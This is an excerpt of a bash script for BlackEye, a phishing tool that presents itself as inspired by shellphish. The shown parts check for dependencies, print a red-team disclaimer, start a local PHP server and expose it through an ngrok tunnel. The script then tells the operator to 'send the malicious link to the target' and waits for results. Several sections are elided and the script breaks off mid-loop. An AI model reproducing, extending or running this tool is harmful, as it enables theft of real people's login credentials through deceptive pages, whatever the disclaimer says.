#!/bin/bash
#Generally inspired by shellphish/@linuxchoice
trap 'printf "\n";stop;exit 1' 2


dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "[X] PHP not installed. Run setup.sh"; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "[X]WGET not installed. Run setup.sh"; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "[X]UNZIP not installed. Run setup.sh"; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "[X]CURL not installed. Run setup.sh"; exit 1; }
...
printf "\n\e[91mDisclaimer: BlackEye is a phishing tool created for purposes such as : \n 1.Making red teamers life easier while doing a phishing campaign \n 2.Showing how close to realistic can a phishing attack get.\n"
printf "\n\e[91mDevelopers assume no liability and are not responsible for damage caused by blackeye. \nAttacking targets without consent is illegal. Use at your own risk! \n"
...
printf "\e[1;92m[\e[0m*\e[1;92m] Starting php local server...\n"
...
link=$(curl --silent http://127.0.0.1:4040/api/tunnels | jq '.tunnels[0].public_url')
printf "\e[1;92m[\e[0m*\e[1;92m] Send the malicious link to the target:\e[0m\e[1;77m %s\e[0m\n" $link
checkfound
}
checkfound() {


printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for results ...\e[0m\n"
while [ true ]; do
